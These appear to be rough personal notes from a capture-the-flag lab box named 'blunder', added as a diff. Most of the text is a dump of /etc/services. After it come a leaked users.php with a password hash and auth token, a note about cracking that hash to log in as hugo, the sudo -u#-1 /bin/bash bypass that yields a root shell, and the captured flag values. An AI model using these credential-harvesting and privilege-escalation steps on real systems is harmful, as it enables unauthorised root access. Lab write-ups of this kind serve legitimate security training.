+   12 root      rt   0       0      0      0 S   0.0   0.0   0:00.20 
+
+
+www-data@blunder:/$ cat /etc/services 
+# Network services, Internet style
+#
+# Note that it is presently the policy of IANA to assign a single well-known
+# port number for both TCP and UDP; hence, officially ports have two entries
+# even if the protocol doesn't support UDP operations.
+#
+# Updated from https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml .
+#
+# New ports will be added on request if they have been officially assigned
+# by IANA and used in the real-world or are needed by a debian package.
+# If you need a huge list of used numbers please install the nmap package.
+
+tcpmux          1/tcp                           # TCP port service multiplexer
+echo            7/tcp
+echo            7/udp
+discard         9/tcp           sink null
+discard         9/udp           sink null
+systat          11/tcp          users
+daytime         13/tcp
+daytime         13/udp
+netstat         15/tcp
+qotd            17/tcp          quote
+msp             18/tcp                          # message send protocol
+msp             18/udp
+chargen         19/tcp          ttytst source
+chargen         19/udp          ttytst source
+ftp-data        20/tcp
+ftp             21/tcp
+fsp             21/udp          fspd
+ssh             22/tcp                          # SSH Remote Login Protocol
+telnet          23/tcp
+smtp            25/tcp          mail
+time            37/tcp          timserver
+time            37/udp          timserver
+rlp             39/udp          resource        # resource location
+nameserver      42/tcp          name            # IEN 116
+whois           43/tcp          nicname
+tacacs          49/tcp                          # Login Host Protocol (TACACS)
+tacacs          49/udp
+domain          53/tcp                          # Domain Name Server
+domain          53/udp
+bootps          67/udp
+bootpc          68/udp
+tftp            69/udp
+gopher          70/tcp                          # Internet Gopher
+finger          79/tcp
+http            80/tcp          www             # WorldWideWeb HTTP
+link            87/tcp          ttylink
+kerberos        88/tcp          kerberos5 krb5 kerberos-sec     # Kerberos v5
+kerberos        88/udp          kerberos5 krb5 kerberos-sec     # Kerberos v5
+iso-tsap        102/tcp         tsap            # part of ISODE
+acr-nema        104/tcp         dicom           # Digital Imag. & Comm. 300
+pop3            110/tcp         pop-3           # POP version 3
+sunrpc          111/tcp         portmapper      # RPC 4.0 portmapper
+sunrpc          111/udp         portmapper
+auth            113/tcp         authentication tap ident
+sftp            115/tcp
+nntp            119/tcp         readnews untp   # USENET News Transfer Protocol
+ntp             123/udp                         # Network Time Protocol
+epmap           135/tcp         loc-srv         # DCE endpoint resolution
+epmap           135/udp         loc-srv
+netbios-ns      137/tcp                         # NETBIOS Name Service
+netbios-ns      137/udp
+netbios-dgm     138/tcp                         # NETBIOS Datagram Service
+netbios-dgm     138/udp
+netbios-ssn     139/tcp                         # NETBIOS session service
+netbios-ssn     139/udp
+imap2           143/tcp         imap            # Interim Mail Access P 2 and 4
+snmp            161/tcp                         # Simple Net Mgmt Protocol
+snmp            161/udp
+snmp-trap       162/tcp         snmptrap        # Traps for SNMP
+snmp-trap       162/udp         snmptrap
+cmip-man        163/tcp                         # ISO mgmt over IP (CMOT)
+cmip-man        163/udp
+cmip-agent      164/tcp
+cmip-agent      164/udp
+mailq           174/tcp                 # Mailer transport queue for Zmailer
+mailq           174/udp
+xdmcp           177/tcp                         # X Display Mgr. Control Proto
+xdmcp           177/udp
+nextstep        178/tcp         NeXTStep NextStep       # NeXTStep window
+nextstep        178/udp         NeXTStep NextStep       #  server
+bgp             179/tcp                         # Border Gateway Protocol
+irc             194/tcp                         # Internet Relay Chat
+irc             194/udp
+smux            199/tcp                         # SNMP Unix Multiplexer
+smux            199/udp
+at-rtmp         201/tcp                         # AppleTalk routing
+at-rtmp         201/udp
+at-nbp          202/tcp                         # AppleTalk name binding
+at-nbp          202/udp
+at-echo         204/tcp                         # AppleTalk echo
+at-echo         204/udp
+at-zis          206/tcp                         # AppleTalk zone information
+at-zis          206/udp
+qmtp            209/tcp                         # Quick Mail Transfer Protocol
+qmtp            209/udp
+z3950           210/tcp         wais            # NISO Z39.50 database
+z3950           210/udp         wais
+ipx             213/tcp                         # IPX
+ipx             213/udp
+ptp-event       319/udp
+ptp-general     320/udp
+pawserv         345/tcp                         # Perf Analysis Workbench
+pawserv         345/udp
+zserv           346/tcp                         # Zebra server
+zserv           346/udp
+fatserv         347/tcp                         # Fatmen Server
+fatserv         347/udp
+rpc2portmap     369/tcp
+rpc2portmap     369/udp                         # Coda portmapper
+codaauth2       370/tcp
+codaauth2       370/udp                         # Coda authentication server
+clearcase       371/tcp         Clearcase
+clearcase       371/udp         Clearcase
+ulistserv       372/tcp                         # UNIX Listserv
+ulistserv       372/udp
+ldap            389/tcp                 # Lightweight Directory Access Protocol
+ldap            389/udp
+imsp            406/tcp                 # Interactive Mail Support Protocol
+imsp            406/udp
+svrloc          427/tcp                         # Server Location
+svrloc          427/udp
+https           443/tcp                         # http protocol over TLS/SSL
+snpp            444/tcp                         # Simple Network Paging Protocol
+snpp            444/udp
+microsoft-ds    445/tcp                         # Microsoft Naked CIFS
+microsoft-ds    445/udp
+kpasswd         464/tcp
+kpasswd         464/udp
+submissions     465/tcp         ssmtp smtps urd # Submission over TLS [RFC8314]
+saft            487/tcp                 # Simple Asynchronous File Transfer
+saft            487/udp
+isakmp          500/tcp                 # IPsec - Internet Security Association
+isakmp          500/udp                 #  and Key Management Protocol
+rtsp            554/tcp                 # Real Time Stream Control Protocol
+rtsp            554/udp
+nqs             607/tcp                         # Network Queuing system
+nqs             607/udp
+npmp-local      610/tcp         dqs313_qmaster          # npmp-local / DQS
+npmp-local      610/udp         dqs313_qmaster
+npmp-gui        611/tcp         dqs313_execd            # npmp-gui / DQS
+npmp-gui        611/udp         dqs313_execd
+hmmp-ind        612/tcp         dqs313_intercell        # HMMP Indication / DQS
+hmmp-ind        612/udp         dqs313_intercell
+asf-rmcp        623/udp         # ASF Remote Management and Control Protocol
+qmqp            628/tcp
+qmqp            628/udp
+ipp             631/tcp                         # Internet Printing Protocol
+ipp             631/udp
+#
+# UNIX specific services
+#
+exec            512/tcp
+biff            512/udp         comsat
+login           513/tcp
+who             513/udp         whod
+shell           514/tcp         cmd             # no passwords used
+syslog          514/udp
+printer         515/tcp         spooler         # line printer spooler
+talk            517/udp
+ntalk           518/udp
+route           520/udp         router routed   # RIP
+timed           525/udp         timeserver
+tempo           526/tcp         newdate
+courier         530/tcp         rpc
+conference      531/tcp         chat
+netnews         532/tcp         readnews
+netwall         533/udp                         # for emergency broadcasts
+gdomap          538/tcp                         # GNUstep distributed objects
+gdomap          538/udp
+uucp            540/tcp         uucpd           # uucp daemon
+klogin          543/tcp                         # Kerberized `rlogin' (v5)
+kshell          544/tcp         krcmd           # Kerberized `rsh' (v5)
+dhcpv6-client   546/tcp
+dhcpv6-client   546/udp
+dhcpv6-server   547/tcp
+dhcpv6-server   547/udp
+afpovertcp      548/tcp                         # AFP over TCP
+afpovertcp      548/udp
+idfp            549/tcp
+idfp            549/udp
+remotefs        556/tcp         rfs_server rfs  # Brunhoff remote filesystem
+nntps           563/tcp         snntp           # NNTP over SSL
+submission      587/tcp                         # Submission [RFC4409]
+ldaps           636/tcp                         # LDAP over SSL
+ldaps           636/udp
+tinc            655/tcp                         # tinc control port
+tinc            655/udp
+silc            706/tcp
+silc            706/udp
+kerberos-adm    749/tcp                         # Kerberos `kadmin' (v5)
+#
+webster         765/tcp                         # Network dictionary
+webster         765/udp
+domain-s        853/tcp                         # DNS over TLS [RFC7858]
+domain-s        853/udp                         # DNS over DTLS [RFC8094]
+rsync           873/tcp
+ftps-data       989/tcp                         # FTP over SSL (data)
+ftps            990/tcp
+telnets         992/tcp                         # Telnet over SSL
+imaps           993/tcp                         # IMAP over SSL
+pop3s           995/tcp                         # POP-3 over SSL
+#
+# From ``Assigned Numbers'':
+#
+#> The Registered Ports are not controlled by the IANA and on most systems
+#> can be used by ordinary user processes or programs executed by ordinary
+#> users.
+#
+#> Ports are used in the TCP [45,106] to name the ends of logical
+#> connections which carry long term conversations.  For the purpose of
+#> providing services to unknown callers, a service contact port is
+#> defined.  This list specifies the port used by the server process as its
+#> contact port.  While the IANA can not control uses of these ports it
+#> does register or list uses of these ports as a convienence to the
+#> community.
+#
+socks           1080/tcp                        # socks proxy server
+socks           1080/udp
+proofd          1093/tcp
+proofd          1093/udp
+rootd           1094/tcp
+rootd           1094/udp
+openvpn         1194/tcp
+openvpn         1194/udp
+rmiregistry     1099/tcp                        # Java RMI Registry
+rmiregistry     1099/udp
+kazaa           1214/tcp
+kazaa           1214/udp
+nessus          1241/tcp                        # Nessus vulnerability
+nessus          1241/udp                        #  assessment scanner
+lotusnote       1352/tcp        lotusnotes      # Lotus Note
+lotusnote       1352/udp        lotusnotes
+ms-sql-s        1433/tcp                        # Microsoft SQL Server
+ms-sql-s        1433/udp
+ms-sql-m        1434/tcp                        # Microsoft SQL Monitor
+ms-sql-m        1434/udp
+ingreslock      1524/tcp
+ingreslock      1524/udp
+datametrics     1645/tcp        old-radius
+datametrics     1645/udp        old-radius
+sa-msg-port     1646/tcp        old-radacct
+sa-msg-port     1646/udp        old-radacct
+kermit          1649/tcp
+kermit          1649/udp
+groupwise       1677/tcp
+groupwise       1677/udp
+l2f             1701/tcp        l2tp
+l2f             1701/udp        l2tp
+radius          1812/tcp
+radius          1812/udp
+radius-acct     1813/tcp        radacct         # Radius Accounting
+radius-acct     1813/udp        radacct
+msnp            1863/tcp                        # MSN Messenger
+msnp            1863/udp
+unix-status     1957/tcp                        # remstats unix-status server
+log-server      1958/tcp                        # remstats log server
+remoteping      1959/tcp                        # remstats remoteping server
+cisco-sccp      2000/tcp                        # Cisco SCCP
+cisco-sccp      2000/udp
+search          2010/tcp        ndtp
+pipe-server     2010/tcp        pipe_server
+nfs             2049/tcp                        # Network File System
+nfs             2049/udp                        # Network File System
+gnunet          2086/tcp
+gnunet          2086/udp
+rtcm-sc104      2101/tcp                        # RTCM SC-104 IANA 1/29/99
+rtcm-sc104      2101/udp
+gsigatekeeper   2119/tcp
+gsigatekeeper   2119/udp
+gris            2135/tcp                # Grid Resource Information Server
+gris            2135/udp
+cvspserver      2401/tcp                        # CVS client/server operations
+cvspserver      2401/udp
+venus           2430/tcp                        # codacon port
+venus           2430/udp                        # Venus callback/wbc interface
+venus-se        2431/tcp                        # tcp side effects
+venus-se        2431/udp                        # udp sftp side effect
+codasrv         2432/tcp                        # not used
+codasrv         2432/udp                        # server port
+codasrv-se      2433/tcp                        # tcp side effects
+codasrv-se      2433/udp                        # udp sftp side effect
+mon             2583/tcp                        # MON traps
+mon             2583/udp
+dict            2628/tcp                        # Dictionary server
+dict            2628/udp
+f5-globalsite   2792/tcp
+f5-globalsite   2792/udp
+gsiftp          2811/tcp
+gsiftp          2811/udp
+gpsd            2947/tcp
+gpsd            2947/udp
+gds-db          3050/tcp        gds_db          # InterBase server
+gds-db          3050/udp        gds_db
+icpv2           3130/tcp        icp             # Internet Cache Protocol
+icpv2           3130/udp        icp
+isns            3205/tcp                        # iSNS Server Port
+isns            3205/udp                        # iSNS Server Port
+iscsi-target    3260/tcp
+mysql           3306/tcp
+mysql           3306/udp
+nut             3493/tcp                        # Network UPS Tools
+nut             3493/udp
+distcc          3632/tcp                        # distributed compiler
+distcc          3632/udp
+daap            3689/tcp                        # Digital Audio Access Protocol
+daap            3689/udp
+svn             3690/tcp        subversion      # Subversion protocol
+svn             3690/udp        subversion
+suucp           4031/tcp                        # UUCP over SSL
+suucp           4031/udp
+sysrqd          4094/tcp                        # sysrq daemon
+sysrqd          4094/udp
+sieve           4190/tcp                        # ManageSieve Protocol
+epmd            4369/tcp                        # Erlang Port Mapper Daemon
+epmd            4369/udp
+remctl          4373/tcp                # Remote Authenticated Command Service
+remctl          4373/udp
+f5-iquery       4353/tcp                        # F5 iQuery
+f5-iquery       4353/udp
+ipsec-nat-t     4500/udp                        # IPsec NAT-Traversal [RFC3947]
+iax             4569/tcp                        # Inter-Asterisk eXchange
+iax             4569/udp
+mtn             4691/tcp                        # monotone Netsync Protocol
+mtn             4691/udp
+radmin-port     4899/tcp                        # RAdmin Port
+radmin-port     4899/udp
+rfe             5002/udp                        # Radio Free Ethernet
+rfe             5002/tcp
+mmcc            5050/tcp        # multimedia conference control tool (Yahoo IM)
+mmcc            5050/udp
+sip             5060/tcp                        # Session Initiation Protocol
+sip             5060/udp
+sip-tls         5061/tcp
+sip-tls         5061/udp
+aol             5190/tcp                        # AIM
+aol             5190/udp
+xmpp-client     5222/tcp        jabber-client   # Jabber Client Connection
+xmpp-client     5222/udp        jabber-client
+xmpp-server     5269/tcp        jabber-server   # Jabber Server Connection
+xmpp-server     5269/udp        jabber-server
+cfengine        5308/tcp
+cfengine        5308/udp
+mdns            5353/tcp                        # Multicast DNS
+mdns            5353/udp
+postgresql      5432/tcp        postgres        # PostgreSQL Database
+postgresql      5432/udp        postgres
+freeciv         5556/tcp        rptp            # Freeciv gameplay
+freeciv         5556/udp
+amqps           5671/tcp                        # AMQP protocol over TLS/SSL
+amqp            5672/tcp
+amqp            5672/udp
+amqp            5672/sctp
+ggz             5688/tcp                        # GGZ Gaming Zone
+ggz             5688/udp
+x11             6000/tcp        x11-0           # X Window System
+x11             6000/udp        x11-0
+x11-1           6001/tcp
+x11-1           6001/udp
+x11-2           6002/tcp
+x11-2           6002/udp
+x11-3           6003/tcp
+x11-3           6003/udp
+x11-4           6004/tcp
+x11-4           6004/udp
+x11-5           6005/tcp
+x11-5           6005/udp
+x11-6           6006/tcp
+x11-6           6006/udp
+x11-7           6007/tcp
+x11-7           6007/udp
+gnutella-svc    6346/tcp                        # gnutella
+gnutella-svc    6346/udp
+gnutella-rtr    6347/tcp                        # gnutella
+gnutella-rtr    6347/udp
+sge-qmaster     6444/tcp        sge_qmaster     # Grid Engine Qmaster Service
+sge-qmaster     6444/udp        sge_qmaster
+sge-execd       6445/tcp        sge_execd       # Grid Engine Execution Service
+sge-execd       6445/udp        sge_execd
+mysql-proxy     6446/tcp                        # MySQL Proxy
+mysql-proxy     6446/udp
+babel           6696/udp                        # Babel Routing Protocol
+ircs-u          6697/tcp                # Internet Relay Chat via TLS/SSL
+afs3-fileserver 7000/tcp        bbs             # file server itself
+afs3-fileserver 7000/udp        bbs
+afs3-callback   7001/tcp                        # callbacks to cache managers
+afs3-callback   7001/udp
+afs3-prserver   7002/tcp                        # users & groups database
+afs3-prserver   7002/udp
+afs3-vlserver   7003/tcp                        # volume location database
+afs3-vlserver   7003/udp
+afs3-kaserver   7004/tcp                        # AFS/Kerberos authentication
+afs3-kaserver   7004/udp
+afs3-volser     7005/tcp                        # volume managment server
+afs3-volser     7005/udp
+afs3-errors     7006/tcp                        # error interpretation service
+afs3-errors     7006/udp
+afs3-bos        7007/tcp                        # basic overseer process
+afs3-bos        7007/udp
+afs3-update     7008/tcp                        # server-to-server updater
+afs3-update     7008/udp
+afs3-rmtsys     7009/tcp                        # remote cache manager service
+afs3-rmtsys     7009/udp
+font-service    7100/tcp        xfs             # X Font Service
+font-service    7100/udp        xfs
+http-alt        8080/tcp        webcache        # WWW caching service
+http-alt        8080/udp
+puppet          8140/tcp                        # The Puppet master service
+bacula-dir      9101/tcp                        # Bacula Director
+bacula-dir      9101/udp
+bacula-fd       9102/tcp                        # Bacula File Daemon
+bacula-fd       9102/udp
+bacula-sd       9103/tcp                        # Bacula Storage Daemon
+bacula-sd       9103/udp
+xmms2           9667/tcp        # Cross-platform Music Multiplexing System
+xmms2           9667/udp
+nbd             10809/tcp                       # Linux Network Block Device
+zabbix-agent    10050/tcp                       # Zabbix Agent
+zabbix-agent    10050/udp
+zabbix-trapper  10051/tcp                       # Zabbix Trapper
+zabbix-trapper  10051/udp
+amanda          10080/tcp                       # amanda backup services
+amanda          10080/udp
+dicom           11112/tcp
+hkp             11371/tcp                       # OpenPGP HTTP Keyserver
+hkp             11371/udp
+bprd            13720/tcp                       # VERITAS NetBackup
+bprd            13720/udp
+bpdbm           13721/tcp                       # VERITAS NetBackup
+bpdbm           13721/udp
+bpjava-msvc     13722/tcp                       # BP Java MSVC Protocol
+bpjava-msvc     13722/udp
+vnetd           13724/tcp                       # Veritas Network Utility
+vnetd           13724/udp
+bpcd            13782/tcp                       # VERITAS NetBackup
+bpcd            13782/udp
+vopied          13783/tcp                       # VERITAS NetBackup
+vopied          13783/udp
+db-lsp          17500/tcp                       # Dropbox LanSync Protocol
+dcap            22125/tcp                       # dCache Access Protocol
+gsidcap         22128/tcp                       # GSI dCache Access Protocol
+wnn6            22273/tcp                       # wnn6
+wnn6            22273/udp
+
+#
+# Datagram Delivery Protocol services
+#
+rtmp            1/ddp                   # Routing Table Maintenance Protocol
+nbp             2/ddp                   # Name Binding Protocol
+echo            4/ddp                   # AppleTalk Echo Protocol
+zip             6/ddp                   # Zone Information Protocol
+
+#=========================================================================
+# The remaining port numbers are not as allocated by IANA.
+#=========================================================================
+
+# Kerberos (Project Athena/MIT) services
+# Note that these are for Kerberos v4, and are unofficial.  Sites running
+# v4 should uncomment these and comment out the v5 entries above.
+#
+kerberos4       750/udp         kerberos-iv kdc # Kerberos (server)
+kerberos4       750/tcp         kerberos-iv kdc
+kerberos-master 751/udp         kerberos_master # Kerberos authentication
+kerberos-master 751/tcp
+passwd-server   752/udp         passwd_server   # Kerberos passwd server
+krb-prop        754/tcp         krb_prop krb5_prop hprop # Kerberos slave propagation
+krbupdate       760/tcp         kreg            # Kerberos registration
+swat            901/tcp                         # swat
+kpop            1109/tcp                        # Pop with Kerberos
+knetd           2053/tcp                        # Kerberos de-multiplexor
+zephyr-srv      2102/udp                        # Zephyr server
+zephyr-clt      2103/udp                        # Zephyr serv-hm connection
+zephyr-hm       2104/udp                        # Zephyr hostmanager
+eklogin         2105/tcp                        # Kerberos encrypted rlogin
+# Hmmm. Are we using Kv4 or Kv5 now? Worrying.
+# The following is probably Kerberos v5  --- ajt@debian.org (11/02/2000)
+kx              2111/tcp                        # X over Kerberos
+iprop           2121/tcp                        # incremental propagation
+#
+# Unofficial but necessary (for NetBSD) services
+#
+supfilesrv      871/tcp                         # SUP server
+supfiledbg      1127/tcp                        # SUP debugging
+
+#
+# Services added for the Debian GNU/Linux distribution
+#
+poppassd        106/tcp                         # Eudora
+poppassd        106/udp
+moira-db        775/tcp         moira_db        # Moira database
+moira-update    777/tcp         moira_update    # Moira update protocol
+moira-ureg      779/udp         moira_ureg      # Moira user registration
+spamd           783/tcp                         # spamassassin daemon
+omirr           808/tcp         omirrd          # online mirror
+omirr           808/udp         omirrd
+customs         1001/tcp                        # pmake customs server
+customs         1001/udp
+skkserv         1178/tcp                        # skk jisho server port
+predict         1210/udp                        # predict -- satellite tracking
+rmtcfg          1236/tcp                        # Gracilis Packeten remote config server
+wipld           1300/tcp                        # Wipl network monitor
+xtel            1313/tcp                        # french minitel
+xtelw           1314/tcp                        # french minitel
+support         1529/tcp                        # GNATS
+cfinger         2003/tcp                        # GNU Finger
+frox            2121/tcp                        # frox: caching ftp proxy
+ninstall        2150/tcp                        # ninstall service
+ninstall        2150/udp
+zebrasrv        2600/tcp                        # zebra service
+zebra           2601/tcp                        # zebra vty
+ripd            2602/tcp                        # ripd vty (zebra)
+ripngd          2603/tcp                        # ripngd vty (zebra)
+ospfd           2604/tcp                        # ospfd vty (zebra)
+bgpd            2605/tcp                        # bgpd vty (zebra)
+ospf6d          2606/tcp                        # ospf6d vty (zebra)
+ospfapi         2607/tcp                        # OSPF-API
+isisd           2608/tcp                        # ISISd vty (zebra)
+afbackup        2988/tcp                        # Afbackup system
+afbackup        2988/udp
+afmbackup       2989/tcp                        # Afmbackup system
+afmbackup       2989/udp
+xtell           4224/tcp                        # xtell server
+fax             4557/tcp                        # FAX transmission service (old)
+hylafax         4559/tcp                        # HylaFAX client-server protocol (new)
+distmp3         4600/tcp                        # distmp3host daemon
+munin           4949/tcp        lrrd            # Munin
+enbd-cstatd     5051/tcp                        # ENBD client statd
+enbd-sstatd     5052/tcp                        # ENBD server statd
+pcrd            5151/tcp                        # PCR-1000 Daemon
+noclog          5354/tcp                        # noclogd with TCP (nocol)
+noclog          5354/udp                        # noclogd with UDP (nocol)
+hostmon         5355/tcp                        # hostmon uses TCP (nocol)
+hostmon         5355/udp                        # hostmon uses UDP (nocol)
+rplay           5555/udp                        # RPlay audio service
+nrpe            5666/tcp                        # Nagios Remote Plugin Executor
+nsca            5667/tcp                        # Nagios Agent - NSCA
+mrtd            5674/tcp                        # MRT Routing Daemon
+bgpsim          5675/tcp                        # MRT Routing Simulator
+canna           5680/tcp                        # cannaserver
+syslog-tls      6514/tcp                        # Syslog over TLS [RFC5425]
+sane-port       6566/tcp        sane saned      # SANE network scanner daemon
+ircd            6667/tcp                        # Internet Relay Chat
+zope-ftp        8021/tcp                        # zope management by ftp
+tproxy          8081/tcp                        # Transparent Proxy
+omniorb         8088/tcp                        # OmniORB
+omniorb         8088/udp
+clc-build-daemon 8990/tcp                       # Common lisp build daemon
+xinetd          9098/tcp
+mandelspawn     9359/udp        mandelbrot      # network mandelbrot
+git             9418/tcp                        # Git Version Control System
+zope            9673/tcp                        # zope server
+webmin          10000/tcp
+kamanda         10081/tcp                       # amanda backup services (Kerberos)
+kamanda         10081/udp
+amandaidx       10082/tcp                       # amanda backup services
+amidxtape       10083/tcp                       # amanda backup services
+smsqp           11201/tcp                       # Alamin SMS gateway
+smsqp           11201/udp
+xpilot          15345/tcp                       # XPilot Contact Port
+xpilot          15345/udp
+sgi-cmsd        17001/udp               # Cluster membership services daemon
+sgi-crsd        17002/udp
+sgi-gcd         17003/udp                       # SGI Group membership daemon
+sgi-cad         17004/tcp                       # Cluster Admin daemon
+isdnlog         20011/tcp                       # isdn logging system
+isdnlog         20011/udp
+vboxd           20012/tcp                       # voice box system
+vboxd           20012/udp
+binkp           24554/tcp                       # binkp fidonet protocol
+asp             27374/tcp                       # Address Search Protocol
+asp             27374/udp
+csync2          30865/tcp                       # cluster synchronization tool
+dircproxy       57000/tcp                       # Detachable IRC Proxy
+tfido           60177/tcp                       # fidonet EMSI over telnet
+fido            60179/tcp                       # fidonet EMSI over TCP
+
+# Local services
+
+
+www-data@blunder:/ftp$ cat note.txt
+cat note.txt
+Hey Sophie
+I've left the thing you're looking for in here for you to continue my work
+when I leave. The other thing is the same although Ive left it elsewhere too.
+
+Its using the method we talked about; dont leave it on a post-it note this time!
+
+Thanks
+Shaun
+
+ cat users.php
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""}
+}
+
+kristenanne
+
+
+so kristenanne was wrong but decrypting the hash faca... online is Password120 
+trying to figure out how to get hashcat to do it
+
+www-data@blunder:/$ su -l hugo
+Password: 
+hugo@blunder:~$ ls -al
+total 80
+drwxr-xr-x 16 hugo hugo 4096 May 26 09:29 .
+drwxr-xr-x  4 root root 4096 Apr 27 14:31 ..
+lrwxrwxrwx  1 root root    9 Apr 28 12:13 .bash_history -> /dev/null
+-rw-r--r--  1 hugo hugo  220 Nov 28  2019 .bash_logout
+-rw-r--r--  1 hugo hugo 3771 Nov 28  2019 .bashrc
+drwx------ 13 hugo hugo 4096 Apr 27 14:29 .cache
+drwx------ 11 hugo hugo 4096 Nov 28  2019 .config
+drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Desktop
+drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Documents
+drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Downloads
+drwx------  3 hugo hugo 4096 Apr 27 14:30 .gnupg
+drwxrwxr-x  3 hugo hugo 4096 Nov 28  2019 .local
+drwx------  5 hugo hugo 4096 Apr 27 14:29 .mozilla
+drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Music
+drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Pictures
+-rw-r--r--  1 hugo hugo  807 Nov 28  2019 .profile
+drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Public
+drwx------  2 hugo hugo 4096 Apr 27 14:30 .ssh
+drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Templates
+-r--------  1 hugo hugo   33 Nov 28  2019 user.txt
+drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Videos
+hugo@blunder:~$ cat user.txt
+7a618f992b77b477be29f9c2060b19eb
+hugo@blunder:~$ 
+
+~~~~~~~~~~~~~~~~~~~`
+google fu
+~~~~~~~~~~~~~~~~~~~~~~`
+
+hugo@blunder:/$ sudo -u#-1 /bin/bash
+root@blunder:/#
+
+root@blunder:/root# cat root.txt 
+e7a753a0f41ac06baff038f16559241a
+
+went back for user again??
+0c47db2a2e5e96928b18902f24926e8a
+
+
